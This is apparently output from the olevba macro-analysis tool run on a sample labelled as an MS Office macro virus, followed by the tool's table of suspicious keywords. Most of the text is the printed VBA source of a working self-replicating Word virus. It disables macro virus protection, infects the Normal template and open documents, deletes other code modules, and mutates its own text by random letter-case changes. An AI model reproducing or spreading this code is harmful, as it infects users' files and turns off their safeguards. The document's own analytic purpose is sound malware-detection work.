olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Source-0d96e11307705a6005301c775deae87d28aac69b
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Source-0d96e11307705a6005301c775deae87d28aac69b 
in file: Virus.MSOffice.Source-0d96e11307705a6005301c775deae87d28aac69b - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_open()
On Error Resume Next
Options.VirusProtection = 0: EnableCancelKey = 0
Set maci = MacroContainer.VBProject.vbcomponents.Item(1)
Set macic = maci.codemodule
mi = Left(macic.lines(1, 1), 21)
Set inf = NormalTemplate: miy = mi + "close"
If MacroContainer = inf Then Set inf = ActiveDocument: miy = mi + "open"
Set infc = inf.VBProject.vbcomponents
Set infi = infc.Item(1)
Set infic = infi.codemodule
s = UCase$(macic.lines(1, 25))
For ku = 1 To Len(s)
t = Mid(s, ku, 1)
If Asc(t) < 90 And Asc(t) > 65 Then t = Chr$(Asc(t) + Int(Rnd * 2) * 32)
p = p & t
Next ku
macic.deletelines 1, 25
macic.addfromstring p
For ik = 2 To infc.Count: infc.Remove infc.Item(2): Next ik
infic.deletelines 1, infic.countoflines
infic.addfromstring p
infic.replaceline 1, miy
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub 'SelfTextPolymorphism (stp-demo) v1.1 3:16pm tue may 18 99
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|open                |May open a file                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

